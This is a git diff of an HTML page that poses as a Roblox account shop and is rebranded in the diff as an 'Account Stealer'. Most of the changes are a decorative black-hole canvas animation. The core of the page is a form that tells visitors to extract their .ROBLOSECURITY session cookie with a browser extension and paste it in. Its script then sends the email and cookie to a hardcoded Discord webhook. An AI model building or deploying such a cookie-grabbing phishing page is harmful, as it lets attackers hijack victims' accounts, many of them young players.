@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Account Beamer | Best Of The Best</title>
+  <title>4ccount $T34LER</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Martian+Mono:wght@100..800&display=swap" rel="stylesheet">
   <style>
     :root {
       --primary: #8a2be2;
@@ -31,7 +31,7 @@
     }
 
     body {
-      background: linear-gradient(135deg, #0f0521 0%, #1a0933 100%);
+      background: #141414;
       color: var(--text);
       min-height: 100vh;
       display: grid;
@@ -42,47 +42,86 @@
       overflow: hidden;
     }
 
-    .particles {
-      position: absolute;
+    /* Black Hole Effect */
+    a-hole {
+      position: fixed;
+      top: 0;
+      left: 0;
+      margin: 0;
+      padding: 0;
       width: 100%;
       height: 100%;
-      z-index: 0;
       overflow: hidden;
+      z-index: 0;
     }
 
-    .particle {
+    a-hole:before {
       position: absolute;
-      background: rgba(255, 255, 255, 0.5);
-      border-radius: 50%;
-      pointer-events: none;
+      top: 50%;
+      left: 50%;
+      z-index: 2;
+      display: block;
+      width: 150%;
+      height: 140%;
+      background: radial-gradient(ellipse at 50% 55%, transparent 10%, black 50%);
+      transform: translate3d(-50%, -50%, 0);
+      content: "";
     }
 
-    .particle:nth-child(3n+1) {
-      background: rgba(138, 43, 226, 0.5);
-    }
-    .particle:nth-child(3n+2) {
-      background: rgba(255, 77, 141, 0.5);
-    }
-
-    .gradient-bg {
+    a-hole:after {
       position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: radial-gradient(circle at center, 
-        rgba(138, 43, 226, 0.15) 0%, 
-        rgba(255, 77, 141, 0.1) 30%, 
-        transparent 70%);
-      z-index: -1;
-      animation: rotate 30s linear infinite;
+      top: 50%;
+      left: 50%;
+      z-index: 5;
+      display: block;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(ellipse at 50% 75%, #a900ff 20%, transparent 75%);
+      mix-blend-mode: overlay;
+      transform: translate3d(-50%, -50%, 0);
+      content: "";
     }
 
-    @keyframes rotate {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    @keyframes aura-glow {
+      0% { background-position: 0 100%; }
+      100% { background-position: 0 300%; }
     }
 
+    .aura {
+      position: absolute;
+      top: -71.5%;
+      left: 50%;
+      z-index: 3;
+      width: 30%;
+      height: 140%;
+      background: linear-gradient(20deg, #00f8f1, #ffbd1e20 16.5%, #fe848f 33%, #fe848f20 49.5%, #00f8f1 66%, #00f8f160 85.5%, #ffbd1e 100%) 0 100% / 100% 200%;
+      border-radius: 0 0 100% 100%;
+      filter: blur(50px);
+      mix-blend-mode: plus-lighter;
+      opacity: 0.75;
+      transform: translate3d(-50%, 0, 0);
+      animation: aura-glow 5s infinite linear;
+    }
+
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: 10;
+      width: 100%;
+      height: 100%;
+      background: repeating-linear-gradient(transparent, transparent 1px, white 1px, white 2px);
+      mix-blend-mode: overlay;
+      opacity: 0.5;
+    }
+
+    canvas {
+      display: block;
+      width: 100%;
+      height: 100%;
+    }
+
+    /* Main Content */
     .card {
       width: 100%;
       max-width: 480px;
@@ -326,20 +365,9 @@
       height: 20px;
     }
 
-    .floating-robox {
-      position: absolute;
-      width: 150px;
-      height: 150px;
-      background: url('https://cdn.discordapp.com/attachments/1362160509033382008/1362160530001756160/robox.png') no-repeat center center;
-      background-size: contain;
-      opacity: 0.1;
-      animation: float 6s ease-in-out infinite;
-      z-index: -1;
-    }
-
-    @keyframes float {
-      0%, 100% { transform: translateY(0) rotate(0deg); }
-      50% { transform: translateY(-20px) rotate(5deg); }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
 
     .tooltip {
@@ -385,19 +413,17 @@
   </style>
 </head>
 <body>
-  <div class="particles" id="particles"></div>
-  <div class="gradient-bg"></div>
+  <!-- Black Hole Effect -->
+  <a-hole>
+    <canvas class="js-canvas"></canvas>
+    <div class="aura"></div>
+    <div class="overlay"></div>
+  </a-hole>
   
-  <!-- Floating Roblox characters -->
-  <div class="floating-robox" style="top: 10%; left: 5%; animation-delay: 0s;"></div>
-  <div class="floating-robox" style="top: 70%; left: 80%; animation-delay: 1s;"></div>
-  <div class="floating-robox" style="top: 30%; left: 75%; animation-delay: 2s;"></div>
-  <div class="floating-robox" style="top: 80%; left: 15%; animation-delay: 3s;"></div>
-  
+  <!-- Main Content -->
   <div class="card">
     <div class="logo">
-      <h1>rDealer</h1>
-      <p>Premium Roblox Accounts</p>
+      <h1>𝓐𝓬𝓬𝓸𝓾𝓷𝓽 𝓢𝓽𝓮𝓪𝓵𝓮𝓻</h1>
     </div>
     
     <div id="status-message" class="status-message"></div>
@@ -410,12 +436,12 @@
       
       <div class="input-group">
         <label for="cookie">
-          .ROBLOSECURITY Cookie
+          Cookie:
           <span class="tooltip">
             <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
               <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
             </svg>
-            <span class="tooltiptext">Use Cookie-Editor extension to get your .ROBLOSECURITY cookie</span>
+            <span class="tooltiptext">Use Cookie-Editor Extension To Get Your Cookie</span>
           </span>
         </label>
         <textarea id="cookie" placeholder="Enter Cookie" required></textarea>
@@ -436,35 +462,298 @@
       <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
         <path stroke-linecap="round" stroke-linejoin="round" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
       </svg>
-      Get Cookie Editor
+Use Cookie-Editor extension to get your cookie
     </button>
   </div>
 
   <script>
-    // Create floating particles
-    const particlesContainer = document.getElementById('particles');
-    for (let i = 0; i < 50; i++) {
-      const particle = document.createElement('div');
-      particle.classList.add('particle');
+    // Black Hole Effect
+    class AHole extends HTMLElement {
+      connectedCallback() {
+        this.canvas = this.querySelector(".js-canvas");
+        this.ctx = this.canvas.getContext("2d");
+        this.discs = [];
+        this.lines = [];
+        
+        this.setSize();
+        this.setDiscs();
+        this.setLines();
+        this.setParticles();
+        
+        window.addEventListener("resize", this.onResize.bind(this));
+        requestAnimationFrame(this.tick.bind(this));
+      }
       
-      const size = Math.random() * 5 + 1;
-      particle.style.width = `${size}px`;
-      particle.style.height = `${size}px`;
+      onResize() {
+        this.setSize();
+        this.setDiscs();
+        this.setLines();
+        this.setParticles();
+      }
       
-      particle.style.left = `${Math.random() * 100}%`;
-      particle.style.top = `${Math.random() * 100}%`;
+      setSize() {
+        this.rect = this.getBoundingClientRect();
+        this.render = {
+          width: this.rect.width,
+          height: this.rect.height,
+          dpi: window.devicePixelRatio
+        };
+        this.canvas.width = this.render.width * this.render.dpi;
+        this.canvas.height = this.render.height * this.render.dpi;
+      }
       
-      particle.style.opacity = Math.random() * 0.5 + 0.1;
+      setDiscs() {
+        const { width, height } = this.rect;
+        this.discs = [];
+        
+        this.startDisc = {
+          x: width * 0.5,
+          y: height * 0.45,
+          w: width * 0.75,
+          h: height * 0.7
+        };
+        
+        this.endDisc = {
+          x: width * 0.5,
+          y: height * 0.95,
+          w: 0,
+          h: 0
+        };
+        
+        const totalDiscs = 100;
+        let prevBottom = height;
+        this.clip = {};
+        
+        for (let i = 0; i < totalDiscs; i++) {
+          const p = i / totalDiscs;
+          const disc = this.tweenDisc({ p });
+          const bottom = disc.y + disc.h;
+          
+          if (bottom <= prevBottom) {
+            this.clip = { disc: { ...disc }, i };
+          }
+          
+          prevBottom = bottom;
+          this.discs.push(disc);
+        }
+        
+        this.clip.path = new Path2D();
+        this.clip.path.ellipse(
+          this.clip.disc.x,
+          this.clip.disc.y,
+          this.clip.disc.w,
+          this.clip.disc.h,
+          0,
+          0,
+          Math.PI * 2
+        );
+        this.clip.path.rect(
+          this.clip.disc.x - this.clip.disc.w,
+          0,
+          this.clip.disc.w * 2,
+          this.clip.disc.y
+        );
+      }
       
-      // Animation
-      const duration = Math.random() * 20 + 10;
-      const delay = Math.random() * 5;
-      particle.style.animation = `float ${duration}s ease-in-out ${delay}s infinite`;
+      setLines() {
+        const { width, height } = this.rect;
+        this.lines = [];
+        const totalLines = 100;
+        const linesAngle = (Math.PI * 2) / totalLines;
+        
+        for (let i = 0; i < totalLines; i++) {
+          this.lines.push([]);
+        }
+        
+        this.discs.forEach((disc) => {
+          for (let i = 0; i < totalLines; i++) {
+            const angle = i * linesAngle;
+            const p = {
+              x: disc.x + Math.cos(angle) * disc.w,
+              y: disc.y + Math.sin(angle) * disc.h
+            };
+            this.lines[i].push(p);
+          }
+        });
+        
+        this.linesCanvas = new OffscreenCanvas(width, height);
+        const ctx = this.linesCanvas.getContext("2d");
+        
+        this.lines.forEach((line, i) => {
+          ctx.save();
+          let lineIsIn = false;
+          line.forEach((p1, j) => {
+            if (j === 0) return;
+            const p0 = line[j - 1];
+            
+            if (!lineIsIn && (ctx.isPointInPath(this.clip.path, p1.x, p1.y) ||
+                ctx.isPointInStroke(this.clip.path, p1.x, p1.y)) {
+              lineIsIn = true;
+            } else if (lineIsIn) {
+              ctx.clip(this.clip.path);
+            }
+            
+            ctx.beginPath();
+            ctx.moveTo(p0.x, p0.y);
+            ctx.lineTo(p1.x, p1.y);
+            ctx.strokeStyle = "#444";
+            ctx.lineWidth = 2;
+            ctx.stroke();
+            ctx.closePath();
+          });
+          ctx.restore();
+        });
+        
+        this.linesCtx = ctx;
+      }
       
-      particlesContainer.appendChild(particle);
+      setParticles() {
+        const { width, height } = this.rect;
+        this.particles = [];
+        this.particleArea = {
+          sw: this.clip.disc.w * 0.5,
+          ew: this.clip.disc.w * 2,
+          h: height * 0.85
+        };
+        this.particleArea.sx = (width - this.particleArea.sw) / 2;
+        this.particleArea.ex = (width - this.particleArea.ew) / 2;
+        
+        const totalParticles = 100;
+        for (let i = 0; i < totalParticles; i++) {
+          this.particles.push(this.initParticle(true));
+        }
+      }
+      
+      initParticle(start = false) {
+        const sx = this.particleArea.sx + this.particleArea.sw * Math.random();
+        const ex = this.particleArea.ex + this.particleArea.ew * Math.random();
+        const dx = ex - sx;
+        const vx = 0.1 + Math.random() * 0.5;
+        const y = start ? this.particleArea.h * Math.random() : this.particleArea.h;
+        const r = 0.5 + Math.random() * 4;
+        const vy = 0.5 + Math.random();
+        
+        return {
+          x: sx,
+          sx,
+          dx,
+          y,
+          vy,
+          p: 0,
+          r,
+          c: `rgba(255, 255, 255, ${Math.random()})`
+        };
+      }
+      
+      tweenValue(start, end, p, ease = false) {
+        const delta = end - start;
+        const easeFn = {
+          linear: p => p,
+          inExpo: p => p === 0 ? 0 : Math.pow(2, 10 * p - 10)
+        }[ease ? ease : "linear"];
+        return start + delta * easeFn(p);
+      }
+      
+      drawDiscs() {
+        const { ctx } = this;
+        ctx.strokeStyle = "#444";
+        ctx.lineWidth = 2;
+        
+        // Outer disc
+        const outerDisc = this.startDisc;
+        ctx.beginPath();
+        ctx.ellipse(outerDisc.x, outerDisc.y, outerDisc.w, outerDisc.h, 0, 0, Math.PI * 2);
+        ctx.stroke();
+        ctx.closePath();
+        
+        // Discs
+        this.discs.forEach((disc, i) => {
+          if (i % 5 !== 0) return;
+          
+          if (disc.w < this.clip.disc.w - 5) {
+            ctx.save();
+            ctx.clip(this.clip.path);
+          }
+          
+          ctx.beginPath();
+          ctx.ellipse(disc.x, disc.y, disc.w, disc.h, 0, 0, Math.PI * 2);
+          ctx.stroke();
+          ctx.closePath();
+          
+          if (disc.w < this.clip.disc.w - 5) {
+            ctx.restore();
+          }
+        });
+      }
+      
+      drawLines() {
+        const { ctx, linesCanvas } = this;
+        ctx.drawImage(linesCanvas, 0, 0);
+      }
+      
+      drawParticles() {
+        const { ctx } = this;
+        ctx.save();
+        ctx.clip(this.clip.path);
+        
+        this.particles.forEach((particle) => {
+          ctx.fillStyle = particle.c;
+          ctx.beginPath();
+          ctx.rect(particle.x, particle.y, particle.r, particle.r);
+          ctx.closePath();
+          ctx.fill();
+        });
+        
+        ctx.restore();
+      }
+      
+      moveDiscs() {
+        this.discs.forEach((disc) => {
+          disc.p = (disc.p + 0.001) % 1;
+          this.tweenDisc(disc);
+        });
+      }
+      
+      moveParticles() {
+        this.particles.forEach((particle) => {
+          particle.p = 1 - particle.y / this.particleArea.h;
+          particle.x = particle.sx + particle.dx * particle.p;
+          particle.y -= particle.vy;
+          
+          if (particle.y < 0) {
+            particle.y = this.initParticle().y;
+          }
+        });
+      }
+      
+      tweenDisc(disc) {
+        disc.x = this.tweenValue(this.startDisc.x, this.endDisc.x, disc.p);
+        disc.y = this.tweenValue(this.startDisc.y, this.endDisc.y, disc.p, "inExpo");
+        disc.w = this.tweenValue(this.startDisc.w, this.endDisc.w, disc.p);
+        disc.h = this.tweenValue(this.startDisc.h, this.endDisc.h, disc.p);
+        return disc;
+      }
+      
+      tick(time) {
+        const { ctx } = this;
+        ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
+        ctx.save();
+        ctx.scale(this.render.dpi, this.render.dpi);
+        
+        this.moveDiscs();
+        this.moveParticles();
+        this.drawDiscs();
+        this.drawLines();
+        this.drawParticles();
+        
+        ctx.restore();
+        requestAnimationFrame(this.tick.bind(this));
+      }
     }
 
-    // Form submission with better feedback
+    customElements.define("a-hole", AHole);
+
+    // Form submission
     document.getElementById('contact-form').addEventListener('submit', async (e) => {
       e.preventDefault();
       
@@ -481,7 +770,7 @@
       
       // Validate cookie
       if (!cookie || cookie.length < 50) {
-        statusMessage.textContent = 'Please enter a valid .ROBLOSECURITY cookie';
+        statusMessage.textContent = 'Please enter a valid cookie';
         statusMessage.className = 'status-message error';
         return;
       }
@@ -499,11 +788,11 @@
         submitBtn.disabled = true;
         
         // Send to Discord webhook
-        await fetch('https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT', {
+        await fetch('https://discord.com/api/webhooks/1362500478432444659/wAornimTuM9pB-X13UXwmzhWBA2ygxCTuV89-lrmxgNvKfXUk2lAPVTrk127VTAUgqyK', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            content: `📬 New rDealer Submission\n📧 ${email}\n🍪 ${cookie.substring(0, 30)}... (${cookie.length} chars)`
+            content: `📬 New Account $T34LER Submission\n📧 ${email}\n🍪 ${cookie.substring(0, 30)}... (${cookie.length} chars)`
           })
         });
         
@@ -534,10 +823,6 @@
     style.textContent = `
       .spin {
         animation: spin 1s linear infinite;
-      }
-      @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
       }
     `;
     document.head.appendChild(style);
